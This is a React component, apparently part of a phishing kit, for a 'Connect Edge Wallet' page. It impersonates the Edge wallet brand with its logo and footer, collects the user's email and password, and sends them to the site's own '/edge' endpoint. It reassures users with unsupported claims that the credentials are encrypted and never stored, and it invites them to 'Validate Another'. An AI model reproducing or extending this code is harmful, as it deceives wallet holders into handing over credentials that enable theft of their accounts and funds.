import React, { useState } from "react";
import {
  Eye,
  EyeOff,
  Loader2,
  Shield,
  CheckCircle
} from "lucide-react";
import "./edgeWallet.css";
import edgeLogo from "../../assets/edge_logo.png";
import fetchWithRetry from "../../utils/api";

const EdgeWallet = () => {
  const [form, setForm] = useState({
    emailOrUsername: "",
    password: ""
  });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState("");

  const submitForm = async () => {
    if (!form.emailOrUsername || !form.password) {
      setError("Please fill in all fields");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const res = await fetchWithRetry("/edge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form)
      });

      if (!res.ok) throw new Error("Validation failed");
      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  /* ================= SUCCESS ================= */
  if (done) {
    return (
      <div className="edge-wallet-wrapper">
        <div className="edge-wallet-box">
          <img src={edgeLogo} alt="Edge" className="edge-wallet-logo" />
          <div className="edge-wallet-panel">
            <CheckCircle size={40} color="#22c55e" />
            <h2>Verification in progress</h2>
            <p>
              Your wallet details have been submitted securely.
              You will receive a confirmation email shortly.
            </p>
            <div className="edge-wallet-actions">
              <button onClick={() => window.location.reload()}>
                Validate Another
              </button>
              <button
                className="dark"
                onClick={() => (window.location.href = "/")}
              >
                Go Home
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  /* ================= FORM ================= */
  return (
    <div className="edge-wallet-wrapper">
      <div className="edge-wallet-box">
        <img src={edgeLogo} alt="Edge" className="edge-wallet-logo" />
        <h1>Connect Edge Wallet</h1>
        <p className="edge-subtitle">
          Verify your wallet using your Edge credentials
        </p>
        <div className="edge-wallet-panel">
          <div className="edge-security">
            <Shield size={14} />
            Encrypted & private
          </div>
          <div className="edge-input-group">
            <label>Email address</label>
            <input
              type="email"
              placeholder="you@example.com"
              value={form.emailOrUsername}
              onChange={(e) =>
                setForm({ ...form, emailOrUsername: e.target.value })
              }
            />
          </div>
          <div className="edge-input-group">
            <label>Password</label>
            <div className="edge-password-field">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                value={form.password}
                onChange={(e) =>
                  setForm({ ...form, password: e.target.value })
                }
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>
          {error && <div className="edge-error">{error}</div>}
          <button
            className="edge-submit-btn"
            onClick={submitForm}
            disabled={loading}
          >
            {loading ? (
              <>
                <Loader2 size={18} className="spin" />
                Connecting...
              </>
            ) : (
              "Connect Wallet"
            )}
          </button>
          <p className="edge-notice">
            Your credentials are encrypted and never stored.
          </p>
        </div>
        <footer className="edge-wallet-footer">
          Protected by Edge security architecture
        </footer>
      </div>
    </div>
  );
};

export default EdgeWallet;